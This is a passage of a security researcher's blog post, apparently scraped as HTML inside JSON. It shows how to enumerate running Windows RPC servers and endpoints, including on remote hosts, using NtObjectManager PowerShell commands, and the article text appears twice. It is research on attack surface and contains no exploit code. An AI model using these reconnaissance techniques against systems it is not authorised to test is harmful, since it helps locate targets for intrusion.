to run to get a good list of running RPC servers.</li><li>Can be run against remote servers to find out remotely accessible RPC servers.</li></ul><div><b>Cons:</b></div><div><ul style=\"text-align: left;\"><li>Only returns the RPC servers intentionally registered.</li><li>Doesn't directly give you the hosting process, although the optional annotation might give you a clue.</li><li>Doesn't give you any information about what the RPC server does, you'll need to find what executable it's hosted in and parse it using <i>Get-RpcServer</i>.</li></ul></div><p></p><h3 style=\"text-align: left;\">Service Executable</h3><p style=\"text-align: left;\">If the RPC servers you extract are in a registered system service executable then the module will try and work out what service that corresponds to by querying the SCM. The default output from the <i>Get-RpcServer</i> command will show this as the <i>Service </i>column shown below.</p><div style=\"text-align: left;\"><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">PS&gt; Get-RpcServer C:\\windows\\system32\\appinfo.dll</span><span style=\"font-family: courier;\"><br /></span><span style=\"font-family: courier;\">Name&nbsp; &nbsp; &nbsp; &nbsp; UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Ver Procs EPs Service Running<br /></span><span style=\"font-family: courier;\">----&nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--- ----- --- ------- -------<br /></span><span style=\"font-family: courier;\">appinfo.dll 0497b57d-2e66-424f-a0c6-157cd5d41700 1.0 7&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll 58e604e8-9adb-4d2e-a464-3b0683fb1480 1.0 1&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 1.0 1&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll 5f54ce7d-5b79-4175-8584-cb65313a0e98 1.0 1&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll 201ef99a-7fa0-444c-9399-19ba84f12a1a 1.0 7&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True</span></span></div><p style=\"text-align: left;\">The output also shows the <i>appinfo.dll</i> executable is the implementation of the <i>Appinfo</i> service, which is the general name for the UAC service. Note here that is also shows whether the service is running, but that's just for convenience. You can use this information to find what process is likely to be hosting the RPC server by querying for the service PID if it's running.&nbsp;</p><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-Win32Service -Name Appinfo<br />Name&nbsp; &nbsp; Status&nbsp; ProcessId<br />----&nbsp; &nbsp; ------&nbsp; ---------<br />Appinfo Running 6020</span></div><p style=\"text-align: left;\">The output also shows that each of the interfaces have an endpoint which is registered against the interface UUID and version. This is extracted from the endpoint mapper which makes it again only for convenience. However, if you pick an executable which isn't a service implementation the results are less useful:</p><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcServer C:\\windows\\system32\\efslsaext.dll</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Ver Procs EPs Service Running&nbsp; &nbsp; &nbsp;&nbsp;</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--- ----- --- ------- -------&nbsp; &nbsp; &nbsp;&nbsp;</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">efslsaext.dll c681d488-d850-11d0-... 1.0 21&nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False</span></div><p style=\"text-align: left;\">The <i>efslsaext.dll</i> implements one of the EFS implementations, which are all hosted in LSASS. However, it's not a registered service so the output doesn't show any service name. And it's also not registered with the endpoint mapper so doesn't show any endpoints, but it is running.</p><p><b>Pros:</b></p><p></p><ul><li>If the executable's a service it gives you a good idea of who's hosting the RPC servers and if they're currently running.</li><li>You can get the RPC server interface information along with that information.</li></ul><div><b>Cons:</b></div><div><ul><li>If the executable isn't a service it doesn't directly help.</li><li>It doesn't ensure the RPC servers are running if they're not registered in the endpoint mapper.&nbsp;</li><li>Even if the service is running it might not have enabled the RPC servers.</li></ul></div><h3 style=\"text-align: left;\">Enumerating Process Modules</h3><p style=\"text-align: left;\">Extracting the RPC servers from an arbitrary executable is fine offline, but what if you want to know what RPC servers are running right now? This is similar to <i>RpcView</i>'s process list GUI, you can look at a process and find all all the services running within it.</p><p style=\"text-align: left;\">It turns out there's a really obvious way of getting a list of the potential services running in a process, enumerate the loaded DLLs using an API such as <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-enumerateloadedmodules\">EnumerateLoadedModules</a>, and then run <i>Get-RpcServer</i> on each one to extract the potential services. To use the APIs you'd need to have at least read access to the target process, which means you'd really want to be an administrator, but that's no different to <i>RpcView's </i>limitations.</p><p style=\"text-align: left;\">The big problem is just because a module is loaded it doesn't mean the RPC server is running. For example the WinHTTP DLL has a built-in RPC server which is only loaded when running the WinHTTP proxy service, but the DLL could be loaded in any process which uses the APIs.</p><p style=\"text-align: left;\">To simplify things I expose this approach through the Get-RpcServer function with the <i>ProcessId </i>parameter. You can also use the <i>ServiceName </i>parameter to lookup a service PID if you're interested in a specific service.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\"><span style=\"font-size: x-small;\">PS&gt; Get-RpcEndpoint -ServiceName Appinfo<br /></span></span><span style=\"font-family: courier; font-size: small;\">Name&nbsp; &nbsp; &nbsp; &nbsp; UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Ver Procs EPs Service Running&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; --- ----- --- ------- -------<br /></span><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">RPCRT4.dll&nbsp; afa8bd80-7d8a-11c9-bef4-... 1.0 5&nbsp; &nbsp; &nbsp;0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False<br /></span></span><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">combase.dll e1ac57d7-2eeb-4553-b980-... 0.0 0&nbsp; &nbsp; &nbsp;0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False<br /></span></span><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">combase.dll 00000143-0000-0000-c000-... 0.0 0&nbsp; &nbsp; &nbsp;0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False</span></span></div><div><p><b>Pros:</b></p><p></p><ul><li>You can determine all RPC servers which could be potentially running for an arbitrary process.</li></ul><div><b>Cons:</b></div><div><ul><li>It doesn't ensure the RPC servers are running if they're not registered in the endpoint mapper.&nbsp;</li><li>You can't directly enumerate the module list, except for the main executable, from a protected process (there's are various tricks do so, but out of scope here).</li></ul></div></div><h3 style=\"text-align: left;\">Asking an RPC Endpoint Nicely</h3><div>The final approach is just to ask an RPC endpoint nicely to tell you what RPC servers is supports. We don't need to go digging into the guts of a process to do this, all we need is the binding string for the endpoint we want to query and then call the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtinqifids\">RpcMgmtInqIfIds</a> API.</div><div><br /></div><div>This will only return the UUID and version of the RPC server that's accessible from the endpoint, not the RPC server information. But it will give you an exact list of all supported RPC servers, in fact it's so detailed it'll give you all the COM interfaces that the process is listening on as well. To query this list you only need to access to the endpoint transport, not the process itself.</div><div><br /></div><div>How do you get the endpoints though? One approach is if you do have access to the process you can enumerate its server ALPC ports by getting a list of handles for the process, finding the ports with the <i>\\RPC Control\\</i> prefix in their name and then using that to form the binding string. This approach is exposed through <i>Get-RpcEndpoint's ProcessId</i> parameter. Again it also supports a <i>ServiceName</i> parameter to simplify querying services.</div><div><br /></div><div><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint -ServiceName AppInfo</span></div><div><div><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Version Protocol Endpoint&nbsp; &nbsp; &nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------- -------- --------&nbsp;&nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">0497b57d-2e66-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div><div><span style=\"font-family: courier; font-size: x-small;\">201ef99a-7fa0-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div></div><div><span style=\"font-family: courier; font-size: x-small;\">...</span></div><div><br /></div><div>If you don't have access to the process you can do it in reverse by enumerating potential endpoints and querying each one. For example you could enumerate the <i>\\RPC Control</i> object directory and query each one. Since Windows 10 19H1 ALPC clients can now query the server's PID, so you can not only find out the exposed RPC servers but also what process they're running in. To query from the name of an ALPC port use the <i>AlpcPort</i> parameter with <i>Get-RpcEndpoint</i>.</div><div><br /></div><div><div><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint&nbsp;-AlpcPort LRPC-0ee3261d56342eb7ac</span></div><div><div><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Version Protocol Endpoint&nbsp; &nbsp; &nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------- -------- --------&nbsp;&nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">0497b57d-2e66-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div><div><span style=\"font-family: courier; font-size: x-small;\">201ef99a-7fa0-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div></div><div><span style=\"font-family: courier; font-size: x-small;\">...</span></div></div><div><br /></div><div><p><b>Pros:</b></p><p></p><ul><li>You can determine exactly what RPC servers are running in a process.</li></ul><div><b>Cons:</b></div><div><ul><li>You can't directly determine what the RPC server does as the list gives you no information about which module is hosting it.</li></ul><h3 style=\"text-align: left;\">Combining Approaches</h3><div>Obviously no one approach is perfect. However, you can get most of the way towards <i>RpcView </i>process list by combining the module enumeration approach with asking the endpoint nicely. For example, you could first get a list of potential interfaces by enumerating the modules and parsing the RPC servers, then filter that list to only the ones which are running by querying the endpoint directly. This will also get you a list of the ALPC server ports that the RPC server is running on so you can directly connect to it with a manually built client. And example script for doing this is on <a href=\"https://gist.github.com/tyranid/522c2cce70122289c7139bff413e240a\">github</a>.</div><div><br /></div><div>We are still missing some crucial information that <i>RpcView </i>can access such as the interface registration flags from any approach. Still, hopefully that gives you a few ways to approach analyzing the RPC attack surface of the local system and determining what endpoints you can call.</div></div></div>"}], "summary": "<p>When doing security research I regularly use my <a href=\"https://www.powershellgallery.com/packages/NtObjectManager\">NtObjectManager PowerShell module</a> to discover and call RPC servers on Windows. Typically I'll use the <i>Get-RpcServer</i> command, passing the name of a DLL or EXE file to extract the embedded RPC servers. I can then use the returned server objects to create a client to access the server and call its methods. A <a href=\"https://clearbluejar.github.io/posts/from-ntobjectmanager-to-petitpotam/\">good blog post</a> about how some of this works was written recently by <a href=\"https://twitter.com/clearbluejar\">blueclearjar</a>.</p><p>Using <i>Get-RpcServer</i> only gives you a list of what RPC servers could possibly be running, not whether they are running and if so in what process. This is where the&nbsp;<a href=\"https://github.com/silverf0x/RpcView\">RpcView</a> does better, as it parses a process' in-memory RPC structures to find what is registered and where. Unfortunately this is something that I'm yet to implement in <i>NtObjectManager</i>.&nbsp;</p><p>However, it turns out there's various ways to get the running RPC server information which are provided by OS and the RPC runtime which we can use to get a more or less complete list of running servers. I've exposed all the ones I know about with some recent updates to the module. Let's go through the various ways you can piece together this information.</p><p>NOTE some of the examples of PowerShell code will need a recent build of the <i>NtObjectManager </i>module. For various reasons I've not been updating the version of the PS gallery, so get the source code from <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools\">github</a> and build it yourself.</p><h3 style=\"text-align: left;\">RPC Endpoint Mapper</h3><p style=\"text-align: left;\">If you're lucky this is simplest way to find out if a particular RPC server is running. When an RPC server is started the service can register an RPC interface with the function&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcepregisterw\">RpcEpRegister</a> specifying the interface UUID and version along with the binding information with the RPC endpoint mapper service running in RPCSS. This registers all current RPC endpoints the server is listening on keyed against the RPC interface.&nbsp;</p><p style=\"text-align: left;\">You can query the endpoint table using the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtepeltinqbegin\">RpcMgmtEpEltInqBegin</a> and&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtepeltinqnext\">RpcMgmtEpEltInqNext</a> APIs. I expose this through the <i>Get-RpcEndpoint</i> command. Running&nbsp;<i>Get-RpcEndpoint</i>&nbsp;with no parameters returns all interfaces the local endpoint mapper knows about as shown below.</p><div><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint</span></div><div><div><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version Protocol&nbsp; &nbsp; &nbsp;Endpoint&nbsp; &nbsp; &nbsp; Annotation</span></div><div><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;------- --------&nbsp; &nbsp; &nbsp;--------&nbsp; &nbsp; &nbsp; ----------</span></div><div><span style=\"font-family: courier; font-size: x-small;\">51a227ae-825b-41f2-b4a9-1ac9557a1018 1.0&nbsp; &nbsp; &nbsp;ncacn_ip_tcp 49669&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">0497b57d-2e66-424f-a0c6-157cd5d41700 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; &nbsp; &nbsp; LRPC-5f43...&nbsp; AppInfo</span></div><div><span style=\"font-family: courier; font-size: x-small;\">201ef99a-7fa0-444c-9399-19ba84f12a1a 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; &nbsp; &nbsp; LRPC-5f43...&nbsp; AppInfo</span></div></div><div><span style=\"font-family: courier; font-size: x-small;\">...</span></div><p style=\"text-align: left;\">Note that in addition to the interface UUID and version the output shows the binding information for the endpoint, such as the protocol sequence and endpoint. There is also a free form annotation field, but that can be set to anything the server likes when it calls <i>RpcEpRegister</i>.</p><p style=\"text-align: left;\">The APIs also allow you to specify a remote server hosting the endpoint mapper. You can use this to query what RPC servers are running on a remote server, assuming the firewall doesn't block you. To do this you'd need to specify a binding string for the <i>SearchBinding </i>parameter as shown.</p><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint -SearchBinding 'ncacn_ip_tcp:primarydc'</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version Protocol&nbsp; &nbsp; &nbsp;Endpoint&nbsp; &nbsp; &nbsp;Annotation<br />----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;------- --------&nbsp; &nbsp; &nbsp;--------&nbsp; &nbsp; &nbsp;----------<br />d95afe70-a6d5-4259-822e-2c84da1ddb0d 1.0&nbsp; &nbsp; &nbsp;ncacn_ip_tcp 49664<br />5b821720-f63b-11d0-aad2-00c04fc324db 1.0&nbsp; &nbsp; &nbsp;ncacn_ip_tcp 49688<br />650a7e26-eab8-5533-ce43-9c1dfce11511 1.0&nbsp; &nbsp; &nbsp;ncacn_np&nbsp; &nbsp; &nbsp;\\PIPE\\ROUTER Vpn APIs<br />...</span></div><p style=\"text-align: left;\">The big issue with the RPC endpoint mapper is it only contains RPC interfaces which were explicitly registered against an endpoint. The server could contain many more interfaces which could be accessible, but as they weren't registered they won't be returned from the endpoint mapper. Registration will typically only be used if the server is using an ephemeral name for the endpoint, such as a random TCP port or auto-generated ALPC name.</p><p style=\"text-align: left;\"><b>Pros:</b></p><p style=\"text-align: left;\"></p><ul style=\"text-align: left;\"><li>Simple command to run to get a good list of running RPC servers.</li><li>Can be run against remote servers to find out remotely accessible RPC servers.</li></ul><div><b>Cons:</b></div><div><ul style=\"text-align: left;\"><li>Only returns the RPC servers intentionally registered.</li><li>Doesn't directly give you the hosting process, although the optional annotation might give you a clue.</li><li>Doesn't give you any information about what the RPC server does, you'll need to find what executable it's hosted in and parse it using <i>Get-RpcServer</i>.</li></ul></div><p></p><h3 style=\"text-align: left;\">Service Executable</h3><p style=\"text-align: left;\">If the RPC servers you extract are in a registered system service executable then the module will try and work out what service that corresponds to by querying the SCM. The default output from the <i>Get-RpcServer</i> command will show this as the <i>Service </i>column shown below.</p><div style=\"text-align: left;\"><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">PS&gt; Get-RpcServer C:\\windows\\system32\\appinfo.dll</span><span style=\"font-family: courier;\"><br /></span><span style=\"font-family: courier;\">Name&nbsp; &nbsp; &nbsp; &nbsp; UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Ver Procs EPs Service Running<br /></span><span style=\"font-family: courier;\">----&nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--- ----- --- ------- -------<br /></span><span style=\"font-family: courier;\">appinfo.dll 0497b57d-2e66-424f-a0c6-157cd5d41700 1.0 7&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll 58e604e8-9adb-4d2e-a464-3b0683fb1480 1.0 1&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 1.0 1&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll 5f54ce7d-5b79-4175-8584-cb65313a0e98 1.0 1&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True<br /></span><span style=\"font-family: courier;\">appinfo.dll 201ef99a-7fa0-444c-9399-19ba84f12a1a 1.0 7&nbsp; &nbsp; &nbsp;1&nbsp; &nbsp;Appinfo True</span></span></div><p style=\"text-align: left;\">The output also shows the <i>appinfo.dll</i> executable is the implementation of the <i>Appinfo</i> service, which is the general name for the UAC service. Note here that is also shows whether the service is running, but that's just for convenience. You can use this information to find what process is likely to be hosting the RPC server by querying for the service PID if it's running.&nbsp;</p><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-Win32Service -Name Appinfo<br />Name&nbsp; &nbsp; Status&nbsp; ProcessId<br />----&nbsp; &nbsp; ------&nbsp; ---------<br />Appinfo Running 6020</span></div><p style=\"text-align: left;\">The output also shows that each of the interfaces have an endpoint which is registered against the interface UUID and version. This is extracted from the endpoint mapper which makes it again only for convenience. However, if you pick an executable which isn't a service implementation the results are less useful:</p><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcServer C:\\windows\\system32\\efslsaext.dll</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Ver Procs EPs Service Running&nbsp; &nbsp; &nbsp;&nbsp;</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--- ----- --- ------- -------&nbsp; &nbsp; &nbsp;&nbsp;</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier; font-size: x-small;\">efslsaext.dll c681d488-d850-11d0-... 1.0 21&nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False</span></div><p style=\"text-align: left;\">The <i>efslsaext.dll</i> implements one of the EFS implementations, which are all hosted in LSASS. However, it's not a registered service so the output doesn't show any service name. And it's also not registered with the endpoint mapper so doesn't show any endpoints, but it is running.</p><p><b>Pros:</b></p><p></p><ul><li>If the executable's a service it gives you a good idea of who's hosting the RPC servers and if they're currently running.</li><li>You can get the RPC server interface information along with that information.</li></ul><div><b>Cons:</b></div><div><ul><li>If the executable isn't a service it doesn't directly help.</li><li>It doesn't ensure the RPC servers are running if they're not registered in the endpoint mapper.&nbsp;</li><li>Even if the service is running it might not have enabled the RPC servers.</li></ul></div><h3 style=\"text-align: left;\">Enumerating Process Modules</h3><p style=\"text-align: left;\">Extracting the RPC servers from an arbitrary executable is fine offline, but what if you want to know what RPC servers are running right now? This is similar to <i>RpcView</i>'s process list GUI, you can look at a process and find all all the services running within it.</p><p style=\"text-align: left;\">It turns out there's a really obvious way of getting a list of the potential services running in a process, enumerate the loaded DLLs using an API such as <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-enumerateloadedmodules\">EnumerateLoadedModules</a>, and then run <i>Get-RpcServer</i> on each one to extract the potential services. To use the APIs you'd need to have at least read access to the target process, which means you'd really want to be an administrator, but that's no different to <i>RpcView's </i>limitations.</p><p style=\"text-align: left;\">The big problem is just because a module is loaded it doesn't mean the RPC server is running. For example the WinHTTP DLL has a built-in RPC server which is only loaded when running the WinHTTP proxy service, but the DLL could be loaded in any process which uses the APIs.</p><p style=\"text-align: left;\">To simplify things I expose this approach through the Get-RpcServer function with the <i>ProcessId </i>parameter. You can also use the <i>ServiceName </i>parameter to lookup a service PID if you're interested in a specific service.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\"><span style=\"font-size: x-small;\">PS&gt; Get-RpcEndpoint -ServiceName Appinfo<br /></span></span><span style=\"font-family: courier; font-size: small;\">Name&nbsp; &nbsp; &nbsp; &nbsp; UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Ver Procs EPs Service Running&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; --- ----- --- ------- -------<br /></span><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">RPCRT4.dll&nbsp; afa8bd80-7d8a-11c9-bef4-... 1.0 5&nbsp; &nbsp; &nbsp;0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False<br /></span></span><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">combase.dll e1ac57d7-2eeb-4553-b980-... 0.0 0&nbsp; &nbsp; &nbsp;0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False<br /></span></span><span style=\"font-size: x-small;\"><span style=\"font-family: courier;\">combase.dll 00000143-0000-0000-c000-... 0.0 0&nbsp; &nbsp; &nbsp;0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False</span></span></div><div><p><b>Pros:</b></p><p></p><ul><li>You can determine all RPC servers which could be potentially running for an arbitrary process.</li></ul><div><b>Cons:</b></div><div><ul><li>It doesn't ensure the RPC servers are running if they're not registered in the endpoint mapper.&nbsp;</li><li>You can't directly enumerate the module list, except for the main executable, from a protected process (there's are various tricks do so, but out of scope here).</li></ul></div></div><h3 style=\"text-align: left;\">Asking an RPC Endpoint Nicely</h3><div>The final approach is just to ask an RPC endpoint nicely to tell you what RPC servers is supports. We don't need to go digging into the guts of a process to do this, all we need is the binding string for the endpoint we want to query and then call the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtinqifids\">RpcMgmtInqIfIds</a> API.</div><div><br /></div><div>This will only return the UUID and version of the RPC server that's accessible from the endpoint, not the RPC server information. But it will give you an exact list of all supported RPC servers, in fact it's so detailed it'll give you all the COM interfaces that the process is listening on as well. To query this list you only need to access to the endpoint transport, not the process itself.</div><div><br /></div><div>How do you get the endpoints though? One approach is if you do have access to the process you can enumerate its server ALPC ports by getting a list of handles for the process, finding the ports with the <i>\\RPC Control\\</i> prefix in their name and then using that to form the binding string. This approach is exposed through <i>Get-RpcEndpoint's ProcessId</i> parameter. Again it also supports a <i>ServiceName</i> parameter to simplify querying services.</div><div><br /></div><div><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint -ServiceName AppInfo</span></div><div><div><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Version Protocol Endpoint&nbsp; &nbsp; &nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------- -------- --------&nbsp;&nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">0497b57d-2e66-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div><div><span style=\"font-family: courier; font-size: x-small;\">201ef99a-7fa0-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div></div><div><span style=\"font-family: courier; font-size: x-small;\">...</span></div><div><br /></div><div>If you don't have access to the process you can do it in reverse by enumerating potential endpoints and querying each one. For example you could enumerate the <i>\\RPC Control</i> object directory and query each one. Since Windows 10 19H1 ALPC clients can now query the server's PID, so you can not only find out the exposed RPC servers but also what process they're running in. To query from the name of an ALPC port use the <i>AlpcPort</i> parameter with <i>Get-RpcEndpoint</i>.</div><div><br /></div><div><div><span style=\"font-family: courier; font-size: x-small;\">PS&gt; Get-RpcEndpoint&nbsp;-AlpcPort LRPC-0ee3261d56342eb7ac</span></div><div><div><span style=\"font-family: courier; font-size: x-small;\">UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Version Protocol Endpoint&nbsp; &nbsp; &nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------- -------- --------&nbsp;&nbsp;</span></div><div><span style=\"font-family: courier; font-size: x-small;\">0497b57d-2e66-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div><div><span style=\"font-family: courier; font-size: x-small;\">201ef99a-7fa0-... 1.0&nbsp; &nbsp; &nbsp;ncalrpc&nbsp; \\RPC Control\\LRPC-0ee3...</span></div></div><div><span style=\"font-family: courier; font-size: x-small;\">...</span></div></div><div><br /></div><div><p><b>Pros:</b></p><p></p><ul><li>You can determine exactly what RPC servers are running in a process.</li></ul><div><b>Cons:</b></div><div><ul><li>You can't directly determine what the RPC server does as the list gives you no information about which module is hosting it.</li></ul><h3 style=\"text-align: left;\">Combining Approaches</h3><div>Obviously no one approach is perfect. However, you can get most of the way towards <i>RpcView </i>process list by combining the module enumeration approach with asking the endpoint nicely. For example, you could first get a list of potential interfaces by enumerating the modules and parsing the RPC servers, then filter that list to only the ones which are running by querying the endpoint directly. This will also get you a list of the ALPC server ports that the RPC server is running on so you can directly connect to it with a manually built client. And example script for doing this is on <a href=\"https://gist.github.com/tyranid/522c2cce70122289c7139bff413e240a\">github</a>.</div><div><br 